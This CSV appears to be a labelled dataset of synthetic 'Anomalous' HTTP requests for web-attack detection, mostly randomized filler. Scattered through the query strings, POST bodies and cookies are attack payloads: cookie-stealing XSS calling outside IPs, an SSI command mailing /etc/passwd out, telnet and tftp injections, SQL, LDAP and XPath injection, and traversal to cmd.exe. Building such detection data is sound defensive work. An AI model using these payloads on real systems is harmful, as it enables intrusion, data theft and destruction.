"Class","Method","URI","Host-Header","Host","Connection","Accept","Accept-Charset","Accept-Language","Cache-control","Cookie","Pragma","User-Agent","Content-Length","Content-Type","POST-Data","GET-Query"
"Anomalous","POST","/azoydqaF1se4oi0tu9t/t0.acUC5rQK/0dtA7/tegoEoaOtS7yzoneN/jYFTQpwQPbU.css","HTTP/1.0","180.180.241.190","close","audio/*","*;q=0.7","Oub-ods1;q=0.3, ksrsomjs-ne;q=0.2","no-store","rlSohdaUoruOo=yN","no-cache","0WNMCypjdx http://www.0ljohn.cz","235","application/x-www-form-urlencoded","ifnyatelnNmqee=0849&etmoOstti= $i&srh=0805481&aphttoaLi4=g$e eaaEni&RO8enke=ndd2t4osundwc6bt&nsrad0=svdoptldfctqEH)p&tnS=gZeGBNCJ1L&tgt=aeceaanEpvo&uorwr7orowU=803152&gs081aul7tnr=564&pKylUc=4&alit=6&eze=rEcg0olxlsxhurs/&kkdw=4",""
"Anomalous","POST","/9WFf-miEfBlP/aeasLl/s7liLmes7o/oQB6M5sjKjDd/9srlN0i7ot/a2dcFsiE2GcGRYZP6bf/JZQ8psC6execlFPH0U/Ehdpt/em/uii.mspx","HTTP/1.1","www.sSjs.net:930","keep-alive","*/*","*;q=0.0","*;q=0.4","no-transform","i8whe=9262271130;rhttqp8ekioiii=909946;ia3auhsEt=3tTs4","khw=tsIeg","uGvtytSpc (rC.1xwai; tjsFfyWBck; ai-jm@p)","419","application/x-www-form-urlencoded","vdtuabetdnoh=eauc&xpakuel8qruh=/e o&ibuCcinr=s3VKWpvWPXw&atltnT=02226395&oeosrdesna1sdah=<![CDATA[<!--]]  ><script   >[window.open('http://38.247.36.29/icgech.bin'+document.cookie);]//--></script>&atpaieRown3tuo0=4m  &6dfrettMn8hioh=edtt0IeZuTwc0eo&tso7eer5=q&2pn_98Iu=193&binhiq1o67=tCsrRsebH&onfoeCrogaeata=Tee&HOf6b8mailv@_=is=t&lFhhlncqmldl=o6tlRq1lgfhf",""
"Anomalous","GET","/QsCYupdateN/-0Q/8uiEgkocedepye/hJAinaFm1r5jYRNFvM/8sqNo/@P9kPhbf/yzsVR7n3YbKqjmC/df/uu0Pe__C/riwonhefs3n/afi4uwnay.mspx","HTTP/1.0","www.artRnEsA.uk","A73H","*/*;q=0.7","*","ahft9T5-c, i76teuwe-t, d-oogadl;q=0.2, riY-ninms7e;q=0.4, hgwtg-8h;q=0.8","no-cache","nslr=sewt;OEe1Ka6NjyoY=r9sh-e1e';ikctrg8o=18224;deEHoacnsEeioas=25853","no-cache","Mozilla/1.5 (compatible; MSIE 3.7; SunOS sun4u; ddte2a8m)","","","","K0miwai23S=7195&hcnsmmeOer=02188&rfgremin=i&sma=tR9L9YDa9Osn&gjXwXFZpEl=9K2di&y4waAniIt7=31%29%28%26%28objectClass%3Date%29%28%7C%28sn+%3D+++en%29%28cn%3DP++++J*%29%29&estoS4=ev6brJ63gsx&_pRh@AOil9N=lgn3it&TrnyioKs=cher&imgLcdocumentos%uIxi=W+tesdh%40&OPIyimgnWiOdocument4D=bzQoB"
"Anomalous","GET","/aTuoaoogiLoezdbhqurm/a8@0Kwd@k/ybOnJcU/nBD-18L_.png","HTTP/1.1","www.dnoeanr4d.st","close","text/*, image/*","iso-2022-kr;q=0.6, utf-7, cp-932;q=0.8, windows-874;q=0.4, iso-8859-1;q=0.0","sis5-srowtag, sTetno-bltde, fIwr3u-a, aex-t3ms0n9t;q=0.6, a1nrooSn-areirh;q=0.8","no-store","esdG=845 or    count(path/child::node()[position()=((i+j+k+l+1)]   |    path/child::*()[position()=(k+1)])=1   or   381=","","Mozilla/0.7 (X11; U; Open BSD i386 8.6; nt-e3; rv:7.0.8) Gecko/94489722","","","",""
"Anomalous","GET","/vinQ/V9cc_/sue5e2no/aLyqvE/eixfwzSv/_uIK4qarcopyP/wgcTooZBS0iBK_YuiT/ii.exe","HTTP/1.1","www.aoyb4.cz","eieua","audio/basic;q=0.6","*","*","no-transform","noiatSeen=462VQqZi3wzp;prz9Lt=51852086;rrei=)yiwhereoc?risimgrt;oereD=btpkeoto","oWA=ifpt","Mozilla/1.6 (compatible; MSIE 8.9; Win 9x; ttike8t; nDmxen2aae)","","","","ohl0K2CUJ7hsystem=hrcplink&conHTohbuhrh=etc+elc1n%29p&u3Asmoditclab=%29+++%28%7C%28+++cn%3D*o++++%27brien*+++%29%28mail+%3D*o+%27brien*+++%29++++&yni1aveT0vdDpcp=0wass&ito9cin=ssnna&ysn=988&tRcoieaa78tcAo=3anl+%29w"
"Anomalous","PUT","/eihctl1iFsfupCgmd/Nuwoiq2/iKb-3OoFwacv3QByiYBj/ntdtEobOsdres1n8tyo.sh","HTTP/1.0","www.h5uYd.org","keep-alive","*/*","x-mac-chinesesimp;q=0.6, x-mac-korean","rr-ieD;q=0.3, hztlvQi-l, hnLett-3hl;q=0.5","no-cache","PdsS7ei4saasNne=i1E;iftSsbhMb3wy=KSehrlaeoNfshn;hN8i=eeftpurxmlvarel1e;mbu=420984;pAdew=sDZ3C","","lseace/8.2.2.4.5","250","application/x-www-form-urlencoded","ra=694&ebputhFqls=Q&9R8NZ1tD=40602121&ditptos6vbr=c eq0&dia=n c&aobreib5twl=171845&erteuphshotnd=id0amop&7etc.RbAvZQ7=cf&eankocds6a0naak=0&ge2aDaN55pOao2=ldTsostii&stesorh=vsZklrh9Nv&OU2yQ6=91983&wdoT5N=chtamailleee&To8wegNrvOcmol=0070891&A1eetjtSh=2",""
"Anomalous","POST","/amRaleOhiascsjeey.swf","HTTP/1.1","73.239.255.179:9073","close","*/*","*","289)(&(objectClass=rr4h)(|(sn=  2sp)(cn=ncl    J*))","no-store","WDcopyfD-=xM9W_LgrH","oy9af='rpnA'","Mozilla/7.2 (compatible; nthjh3yhI; Open BSD i586; w1HE5k; aletno; fGueb5aeq)","215","application/x-www-form-urlencoded","eatskIev=7etuC1pogun9xer&5e=oitaj&ehyhhve=7&EMrwerahM=hSs\\oi=uldEo<=&@p9mW=onsoanmnces&asotr3ooAlN=5snph-t&4dEdenlZltyssde=axS&ieuthm=yeT_5CLxUJ&7axeeyo=wtoidwc6siy5jelas&Anoreaseiel=c-chtw %&bhdaah=121736",""
"Anomalous","GET","/Ufh/dKYfP5TZDBv9oKv/weTe/bngatndt9soVe4afg/e07p/MBB6Gsbgsound3Lr/rers0te/eXkrAZLRId.png","HTTP/1.0","www.uiita.net","nd47xbfE","image/*;q=0.4, video/mpeg, image/jpeg","*;q=0.1","*;q=0.8","no-cache","7cAcai4otqttnp9=3;l9edatAet=T(csn1l7;p7DX1UzQj_td=koaeabi3unauuimn","clui2pz=7Ew","Mozilla/0.2 (Machintosh; U; PPC Mac OS X 6.6; o3-Sc; rv:3.2.0) Gecko/62843974","","","","4aeoNtjrhosix=shxAhh%2F3%2Fa5t%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D324%5D+++++%7C+++ezn%2Fais%2Fa%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D413%5D+or+++++%27o2h%27++++%3D%27&m94oRoc=+&rcszEvfE7l=MlhnE3ashEenjrah0&ahdhohneookde=79047"
"Anomalous","POST","/ZKjHFLP/trltoRneeeecA590.jpeg","HTTP/1.1","www.Cgx9rev.fr","ciu6eS","*/*","*","fsh-o, iwF-L2hem;q=0.9","max-stale=29","eranartRosh59sp=ypeS;mlmsii1sotet=eGX1bsn;oieexusohs=919;HHRjk79ekAxQ=5eR;2trTrit;pdTtp=inhaetp<cxD","no-cache","9ptmn9e (aEgmhwDJ)","324","application/x-www-form-urlencoded","Qr=cetemnU&irqiLz7a== 0esee5eedCn&eliie=ilw'     or    (i    <  count(2oertg/child::text())     and  j     <    count(qrgsgi/child::comment()) and k  <     count(h0de/child::*)     )     or     'yd7E'    =  ' sl'     or&LeoaoQos=ehs&TDlisaararsi=ndtEeor?tntizo",""
"Anomalous","GET","/tdmae.gif","HTTP/1.0","www.qsdonti.de:80","close","*/*;q=0.8","*;q=0.0","*;q=0.0","no-store","amon7eFsvuuC=88;boErsvned=sew4ohnasa;oEcpfiosy=5;eEecbHo=aHig9rhnxe","eecnay=useeirai","Mozilla/6.8 (Machintosh; U; PPC 4.4; Xh-qH; rv:1.0.6) Gecko/12905692","","","","sHeetexaaolrt=%5C%3B++++%5C%2Fbin%5C%2Fid++++%3B"
"Anomalous","GET","/Dti/-l@55KQ3nrboot.iniV/sgJcCpwMP8L02e8.htm","HTTP/1.0","www.isdib.org:61","pailrxp","audio/basic;q=0.4","*;q=0.3","lwfohCtA-i, aoa-tiEp1;q=0.0","no-cache","xaccess_logDcDaccess_log@Y='    + (    SELECT    TOP 1   nA  FROM   otrt) +    '","no-cache","9sEe2lOdoeetltxehty","","","","Dovafag2hsI=Ac4uouasinrkornUo&thqrFtbzn3=ssee+fbiframee&ereznenfiEy=scriptfromzEb&nwugmty=5756437&slensKEOL7hwg=353&rocchotneail=eait5pirana&eci25eyzneunne=lTtp6_dL0&aoobs=likeeexecev%3Etr&itsoe=7aqt&ndn=416&99l=92r&iu01tmc=192"
"Anomalous","GET","/0Hxrre/ohtpoyrsej9RbNeayani/aoeno8ct6o/dhKder7Atdt9tiaa5dtl/anndqag/mmrA/Sqha3di38almtap/hyzH-4@NLFNV9/3Jf08VA50sgJ2Y/idutf/atso7yparhe/wlspOhte.cgi","HTTP/1.0","www.gnret.com:80","titf","*/*;q=0.9","*;q=0.0","*;q=0.9","no-transform","tdOa8iajweD8h=yIUZq;aeei9u8ltr=dsataktp6m;oftq6Rtwdee=73","rr='egansd'","Mozilla/1.8 (compatible; Konqueror/7.8; Windows NT; eogxne; fmsr5; tsenri)","","","","body4s8F6=29&evr5hosi=295&638aker=%5C-&hKu0ltTl=rt%28meodrUrN+hdt&8ahdhtl4runeuha=54009&3s9replaceincludeG9=nonm1Eeo%27++++or+++++6++%3C+++++count%28path%2Fchild%3A%3A*%29++or++%27e1ca%27+++%3D+%27"
"Anomalous","GET","/6bkphHJH/HM/miiOHacscabrd/hN3KhF2sn_91DESBxo-8/snNYGE6-GxhU19S-c99M/roUG/croG9KW/m1I@NFiONxxM/dgi/ZSJjML/hruusm4Odjeslwd6su.msf","HTTP/1.1","112.192.210.190","close","text/*;q=0.8","*;q=0.2","*;q=0.2","no-cache","mtermtcairtfyHp=egKoae]y;tenEtapu=ah;nf5lhy=6015892;ygaYedafrnoetc=r8MuKzqIe9;RcY3KO=h","no-cache","ndln (tAk4x2BC; e3iQwMj6; avOmh4e)","","","","dllnhtioy=dstu&L9QmT0Eain93Q=%3B+++EXEC%28+++%27INS%27%2B%27ERT++INTO+users+++values%285640%2C%27eSadocts%27%2C%27mdUkte0%27+%29%29&9hlaiyo7dwn4rTh=ucBYvfs-hHu&mirhN=03743074&ftpKCH5jy=rcp&cdaimntm=+oka&tmeshPhatnerc=eLbhhe+onso&sci8bordr=72586902&vtpwmttsUer=8&6SiihhnmARefs=79671&9eo6EfwEt=sepassthruSc58w%40eeL&a2ddpns49ac8t3n=cd3Foo5keVa%3BS%24n&uApninbonfew=gh&eGyiOoAg=%3A%7CRa"
"Anomalous","GET","/galzfsds/eus4ee/rerzDedbexwshtd.htm","HTTP/1.0","www.omGefsee.com","Dnkzritb","*/*;q=0.4","windows-1250, iso-8859-5, iso-8859-3","*","max-stale=6564","XloghrmIj43processing-instructions_=eU@JpTq29w;U4ituh=0;AoeeSxoki=5;6et=seg6at1Rte2eo","nathli='r'","p7rZBn3AQY http://www.rgCiieef.cz","","","","boilrsbo1=sybae2hd0nI&styn=ouYho&ts6noarhFe=deCVM&iey6ntn=rncaneltShoEe3wO&cnshnhh=623&toY6dnnu0en=0ah&_UJ5RP1oazI=41%29%28%26%28objectClass%3DiLre%29%28%7C%28sn++%3D+++saqn%29%28cn%3Dd3H++J*%29%29&nei=ih7uXk4&@lLgJ=5420620619"
"Anomalous","GET","/IDKKTXjOT/JEgsald5djk/lVXUyI1dGeLo4lHytr/ylZ.jpeg","HTTP/1.1","www.q8n5n.de","close","application/*, video/*, video/quicktime","*","*","no-store","zh=eSsaqWdr0y3  ;dnrnLwqqglaeet8=f zptaahsecowr;noesuAz=937263;Iebeii=woa;eiOintla4l=ed;atles=Hdnoanie","no-cache","Mozilla/8.4 (Windows; U; WinNT 3.5; ab-ua; rv:3.9.1) Gecko/05207611","","","","iuJfOyg6P=d73P4&RuEjbolH=s6FxGau7Z&hrugprtooweW=32518&Oan46bwseRgta=itM6dJQ&Rnt0ou=18761696&dx=%29++++%28++++%7C++%28++cn%3D*o%27brien*+++%29%28mail+++%3D*o+%27brien*+%29+++&tiesawhodafaEo=esaoka2ofeigiW&I3h=neg&aitt=%3DnT&OnodetZpassthruYP=%3Bchpe&Eenlehso=aMreOlianwlinkoner&psZqBdMSFfrom=uci7r&gTmtCGhttpsO=cY.fDTlA5H4&8cnaaadxee=rtnsYExeo0isc&tia6io5tprHaeoW=oCjjw"
"Anomalous","GET","/msadc/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe","HTTP/1.1","www.she1maa.be","dwahm","*/*","windows-1250;q=0.2, cp-936, cp-932;q=0.5","*;q=0.1","min-fresh=44","arjat=fromighttp;oq8rude=wN5D7yB;Tj0p=ouziigrtnufde;@W0OnexecG5aR=7niHtls;wpsJuR=36159532;XAYEkK.gphp=Tlr t","no-cache","Mozilla/4.5 (compatible; Konqueror/4.0; Windows NT; reegi; c8ujs; ttmeopd)","","","","/c+dir"
"Anomalous","GET","/scripts/..%c0%qf../winnt/system32/cmd.exe","HTTP/1.0","www.baOnro4H6.com","elialtea","video/*, audio/x-wav","iso-8859-4;q=0.4, cp-936;q=0.1","r36t-lr, s-kHuxe;q=0.4","max-stale=3178","tmeta50document4G-6=pix_pxXbLf-;dVWmLPwB=3897805590;meiDtaw=)","t=n","Mozilla/8.1 (compatible; MSIE 5.2; Open BSD i386; edsn; 7soan; Gutdk)","","","","/c+"
"Anomalous","GET","/ig3y1565rfGlz/dRhWWmY38TF/brwtez6eien8t/Y5replaceusrfdadmin/oeugccmnebmnxA6wrabe/nN/TUY_dUk/ionudsptk/o-SaSMItovunv/t4GdTqmDD_xFsB/huiIelto.cgi","HTTP/1.1","50.195.74.110","close","application/*;q=0.2, audio/x-wav;q=0.5, text/plain","euc-tw","aa-ede, aenLto-ttsWAtsm, e-Itbqa;q=0.2","max-stale=50393","Suwfpltaar0=8;ylgdytnsuoeant=93438;3R3Z-4pob=120438001;LihockBdrnf=1883;E1qcopy6.=57;mophao=1XZEJy","o=s8aa","x4Si@5u http://www.eiteg0s.uk","","","","noOdf=nruzcmatsg&ekN4rl=%3C%21++%23%3C%21--+%23exec+cmd%3D%22id%22--%3E&Insietlcrzlt=deerlscIfagseS%26te"
"Anomalous","PUT","/oeAitoleteia/7insdoa/xhih81/-I9m/ebk9ZxkJu/ml.cfm","HTTP/1.1","36.249.79.3","close","audio/basic, audio/x-wav;q=0.7","windows-1254;q=0.0","4mr-iEbtllt;q=0.7, timjs-mIjulsao, E-lct;q=0.2, me0lm-ws3if","no-transform","ienmErlo=;;G_D6ladminNSetcVm=aVPKOv;eloslzvasL5ai=7;fXoJ6Zi=33493;u0XdexhiScfeihe=e4Hy-Q","no-cache","hBWWojp http://www.Ag9db.be","129","application/x-www-form-urlencoded","gc34ysosd6s=5874&OnAsreeeeybt=ec8a'  or path/child::node()[position()=N]    or  'Eewetsyx'   =    '",""
"Anomalous","GET","/3oU/oUL.J.gDBGEMjf.jpeg","HTTP/1.1","www.rereet5sr.uk","4gaA","*/*","*;q=0.8","dmd-tn, 0-enlN;q=0.1, ayi-e","nws=sTatsnse","Eomdthteiacdi=oE3tr5bin;1ok=e/uevusr etg","no-cache","alhngra81csmMwothts","","","","zdotepeanEdZw=%3Cimg++src%3D+%22livescript%3A%5Bwindow.open%28%27http%3A%2F%2F130.38.114.247%2Fnetrel.nsf%27%2Bdocument.cookie%29%3B%5D++++++%22%3E&uflsqo9scvbe=9738&x3ZlhobjectSid=eso+orcinsert5s+e&itfzt2zweta=sock_streamsancehoa&xtntpcpm=%26l-kr%25estpRishutdown51&ma0ttela=kQqA_W&eottCdteoByhiR=sirstsalt&yvSnynosolqeor=a+eotg&cbodydV7oSx69X=n"
"Anomalous","POST","/z8OpwE/tmpSW/betweenYi3/0RhIvWpA6nF3lTgmSn_1/lekQ-dUFiIrT@xBzmIl.cgi","HTTP/1.1","4.146.16.148","keep-alive","image/png, image/*","windows-1251","re-oyf0, rhnde-i7, eistrfy-ayedc","max-age=31450","uytsnaeasiulot=nane9ripm0o","l3='yaotc'","Mozilla/4.4 (Machintosh; U; PPC Mac OS X 0.2; ao-mi; rv:2.4.7) Gecko/07297210","408","application/x-www-form-urlencoded","rauohud=tsainns&EAm=9nda&nlreTAEeFe=d:&_pbgsoundMiwindow.openaMJY=Recuon&hH.HC=1717&en=Oeiys/34d/mdsbs/child::node()[  position()=28]     |  hgeds/6a/It/child::text()[position()=02] or '40tjo2ht'  ='&afteirzefa=9kstfriaathneereod&tessc=ro&qdH5cez=gAehldsmes&once=dAetn(d=aryrbtk0document&gpOdrltSo=sawqbrcsoerq8g&fqhny2=90&eee0pm=nqtntzaShNToTl",""
"Anomalous","GET","/eKAA/aTra/cvaruxWwindow.opennBzB/Ho2peYnw/H-8opt/h3gmhZP9pNT8696unW7/ismQlvpjjq/20yT-l.shtml","HTTP/1.1","www.ryojseba.net","close","*/*;q=0.6","*;q=0.2","dknntru-Bfavle, aamufe2s-SoenafA;q=0.3, un7-tw6it;q=0.3, m6-eabetnl, d-s2","min-fresh=46","GNZYv=niijtxhhttpieo2lruds8u;lgYxFGnph-DyIbM=aCcaCLWSw;srjO=965260","hnqnezor=1Pee","Mozilla/8.4 (Windows; U; Win 9x 1.7; Fo-p3; rv:6.5.5) Gecko/16774376","","","","wee=8913554&zdaiseaeh=awsdyAjr0st&wdtIiti=83628492&nxtihad5ougots=%27++++%29%3B+++delete+from++users%3B+commit%3B+++++dummy%28++%27"
"Anomalous","GET","/eLBVMEsDS6p9l/obheeNtpecbesese/0z@AL2XAo.pl","HTTP/1.0","214.32.167.145","close","*/*","*;q=0.6","*","max-stale","mieesoscr=9;atst2ser3=029923596","no-cache","ne9NmT2ehpEyae","","","","asen=%29++%28+%7C++%28displayName%3Dhad*%29++%28name+%3D+had*+++%29%28++mail%3Dhad*++++%29&t5ee6=ss&eArrnzneakdemo=380423&anrytxDtwets=hbl6hCYNP&tfeauasit=eoit"
"Anomalous","GET","/ssi/envout.bat","HTTP/1.0","47.248.231.63:80","close","image/png, video/*;q=0.3, audio/basic","windows-1257","*;q=0.3","tvvewn='3exEttok'","j6WQKtdR=d_B7U;madsn=lrRnszyaaS9'i;fnwt0=53888","uyT8t9do=eyre6","iuc7/7.9.7.5.3","","","","|dir%20..............1"
"Anomalous","GET","/gxLsMHscript@07Qm/objectshV9znetcatQ_yfSdrop5/xoklhomp1y/3aocvd/reu4nba/odc/RpR/acceptzE17IqUFkabetweenV1.dll","HTTP/1.1","www.hweixnr7aa.ch:80","glil7","text/html;q=0.4, image/*;q=0.1","iso-2022-jp, euc-kr;q=0.6, x-mac-turkish, iso-2022-jp","u-n0lto","no-store","sD7cnl=k;ArclzwcDaLalox=06207701;ip4=7sa;wM0i=tlnu8u;AJHG=08vrex;ncCunrlawaDy2ir=nn6","no-cache","Mozilla/5.0 (X11; U; SunOS sun4u 4.3; T8-e4; rv:1.3.5) Gecko/27076185","","","","dm5teY=924308196&erbokS8hehN=kh5ce&smgheral=oa&ddhic=%5C%22+%5C%3B+%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.iclimaelllor.com+976%3B"
"Anomalous","PUT","/wAOeR/g48AOntd9HsbaR4aMmPG.asmx","HTTP/1.1","www.Qrmdko.st","7rtfeeop","*/*;q=0.4","x-mac-greek, x-mac-ce;q=0.6","*","no-cache","teefSzzicHdhg=rByipAvyBS_J","w='S'","Mozilla/2.2 (compatible; w1iaiOdb; WinNT; ou8fnl)","241","application/x-www-form-urlencoded","HetnasspaeS=../../../../var/log/access_log%00.html&nr=epjmn&adMou6linkytelnet=42&ngrs=0ov &eu=ugjaaeeRdiwe]&jomemiosdtn=0a&ad5Hto=805595854&yah7ofic=sYAvu9zj&v7P0tP__LaG=amhm244&xe=le&DK5-K=e&sce8tln=tl&uU.I=dnanpstfma>tnip",""
"Anomalous","GET","/ko7aiUdheo0fstrspn7h/o60T0jM0r/npM_/sK.eJM0b9L3Z-Yg@bDr/eD7XtUQgI/et4oeE/aOyg4j8cY8wXMqzBypwY.swf","HTTP/1.0","www.twJhm.biz","keep-alive","*/*","*","*","igaqes='r'","in692knqgY-S=nAt4jh3l;7elr4Afyjedabt=\\\h:Hnna|)56@stits]iu;tceao=$ewoeeehe whereEcmaildC;tqoh4srbl=am","no-cache","fOfckzmPSr http://www.oniore7.it","","","","y2eid8nyEtz=24801390&elmdctemvts=Tl8&nec=afwjMJ&nwqmy2lc=424+++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+94276%3D&aepeiloieeOc=ahttpefrom%3F7jh&gTpM=nodeq%5C%22aoseuaola%22r&e21dt77itimeeOd=921620551&nutSmal=qdooc+tt7lbh&ENxS3=420&tjadepdgdwi5eG=tsre+%264openlon%3Dto"
"Anomalous","GET","/nD/fcdIzTMKd4A1O-cdTFW/atKIpM-AUVWBMcwtZ1lD/.DsN336d9/iU/iAmcafRroe/YFe-2@DU/wgcineEIhynoh/c5F6eeonie3Tru/Stlreeieewgl.js","HTTP/1.0","114.163.198.145","close","image/gif, application/*;q=0.0, text/*","*","*;q=0.0","no-store","oiqrozW=jzqlwocei;agogpdtraaiu=56;thobslqe=t5a;xRgG5Dyselect=5482;soRmLnOmqatqdah=06595650;7aqeuuoowrv=4302081613","no-cache","i2nelryset34","","","","apntdy=osia%29%28%26%28objectClass%3D++wid*%29"
"Anomalous","GET","/tqJHr6ftASdAs_E/mocha7/oPe/eI4D@t@IJYT/oPK6B/sbLe8cht/eeu/tJQz/hvMEoVUyw/4Bsvh6pkMbt7P/7wmGmocha_DPn_wz5/locationcbGcoacceptHWLinputhndt.gif","HTTP/1.0","81.130.136.25:546","tpnLy","image/*;q=0.2, image/*","*","lem6zeL-bohl;q=0.2, pLir-au2e7E;q=0.8, nsnrx6-Piripd","max-stale","kSagioulsfle=erKHtdvyI","xnS8Cen='f'","nkafYedsvisjclcoyeoh","","","","tepap=e9esuAs3jhe2lo&hDXtelnetPrGwK=t3iP0%409v&tceladfddhdndnl=%3C%3Cscript+%3E%5Balert+%28%27prdc8E%27%29%3B%5D%3C%2Fscript++++%3E&tttll1=4seiO&4usrautoexecHD2.4aBf=5056&teuEoesie5cen9=nnuBH5Cc&atesety7ezomese=mna&lctnwWD0edr0wo=cpEaw&AlaiRtekrsYnoJl=cNs&rtifen=tpjn8z3GTC&nr0Eqo=fYXV1i&eetnaHanarszdr=91579"
"Anomalous","GET","/htdtamehBiSaaeeanmpr/dss9m32nstqssk3/ea/tQswjPJ8Bs-/zgPK/24hQC/ttWnuMyQ-4K/acMRrwyd1yODN/ek.de1l/Rntdpeqhf/h22PPKVtXHDbjwRZ-47d/unacftl.asp","HTTP/1.1","www.lt9hp.gov","close","*/*","*","*","max-age=131","j3saot=oocxsnSisohn3T","no-cache","Mozilla/9.2 (Windows; U; Win98 9.5; uN-Ai; rv:2.1.7) Gecko/01172639","","","","rboIl3nro3di=%3Cbody++onload+++%3D+%22++%5Balert++++%28%27pjor1tlbtq%27%29%3B%5D+++%22++++%3E&Pchb3th=rirson7wSai6e3"
"Anomalous","GET","/uusrTl82tPisditeu/cZa.BK-dygTOhq/gh/egnxfde4n9h6da/bkQbRrtuwntbthCo/@I.J/6AhuoSa/im-Ew-.MNs695/mareh2fruln4iojyw.gif","HTTP/1.1","181.175.218.111","close","application/zip, image/png","*;q=0.1","","","","hpoeua=ett8neoe","Mozilla/8.5 (compatible; zbbsUPttc; Win 9x; mhswTnf; niamhqeSon)","","","","utsaoar9mnsic5=i3m&anr2nOmehoiedod=0ntmpjsrL%25Me&ilnorreaKnassd=r%40jP9of8.SCS&enlcainx=5i%40%24&rpv4Heo=72&iaaalhpFte6=22.232.198.140+++%3B++++tftp+192.168.10.33+test.txt"
"Anomalous","GET","/fg/s6escrs/iincludeJkHyHeNxRV/74/LGg/p_LOdPY7c95c/oifonozd/r2t/tnvldE6Hlt/uscitoazehWla.gif","HTTP/1.1","www.ntEeputl.ch:6416","tAscbH","text/*, video/quicktime, text/xml","x-mac-hebrew","*;q=0.6","no-cache","nklt=asuje;evozecoeqaH=4114211;ae5ns=N;p62egn8rdtefg=tcI6;toncrdbytaquor=2993635350;j9wgetTsS=6526805","eL='i'","ehDwQt http://www.hresh.cz","","","","oo0nlsotE=udGXoJlX&LBexD9YBav=uT&Ledem=e8libeh&s5u3o8=2039197&fr8FreEd2onEzt8=0416&E3kWoTgf=498767244&rkitEauO=8lenyn%7Etmps&w8C3outhzagd=ai%29%28++++%7C%28Nui%3D*%29&clonarnwanroese=access_log+z7tace%27so%3Da"
"Anomalous","GET","/e6G5I4W0v7g/op5iroerbn/ujdgy2/iAaL.php","HTTP/1.0","www.ea9iteh.biz","keep-alive","audio/*","*;q=0.6","*","only-if-cached","eweecmn5=hLXWoeKlnlSes5tnaE;ppnnbOfrom=sXIAKy27;4aTYJO=wl_o2;sautst=085943;SUbgnotw=r3c9i9aai7l","no-cache","Mozilla/4.2 (X11; U; SunOS sun4u 3.2; rp-sn; rv:6.9.3) Gecko/01878586","","","","9IasGDGVuSG=%3C%21--++%23exec+++++cmd%3D%22%2Fbin%2Fmail+arFaOrotq.com+++++%3C+%2Fetc%2Fpasswd%22--%3E&1asO=a&chyEv=psaD&JCMtHUP=zJ8%40LWGom&t6hniILlat=apdn5wS"
"Anomalous","PUT","/addthr8Teri6tteqtRti/s@Q/iX@6h5MaGJ/498qLgbABIteTMf/h0l5vcOu51zz683/fbgsound6wazKma/oNqB4PPF8EiDtS/tIgyq@MZE28.png","HTTP/1.0","www.maeh2eecoA.ch:80","aqntEgoT","text/xml;q=0.0","windows-1253;q=0.8, iso-8859-9, iso-8859-8, iso-8859-2;q=0.0, shift_jis","*","no-store","Fs2GxyQ=unionlrElSftp rpsi7between;bZEaWZe8log=esSMc/nyo","I=e9","Mozilla/9.9 (X11; U; Solaris 0.8; ge-eh; rv:6.5.0) Gecko/20204339","323","application/x-www-form-urlencoded","nN4=2dr78aoSse&fneoisfgsfeo=u3EEe\\dh$O&wAaoohs4dt3bl=30843&ni5wzw0lOi=rSqE.zByW&svhaaRnybALaNu=[edIOus&scripti+<paoa2&nieexlEnon=s gro)&oyynayreZh=CtosmkinputOarnas(s&2alteda=tQJiWHVFJMp&aeyancerue=cb2s?hbIlrnes|/&hsI4gw=8&erndsanj=biOs=&2n=riat&usavydeoneedey=\\\nls   :/root/&kqm3HjI07=Mqwlngi",""
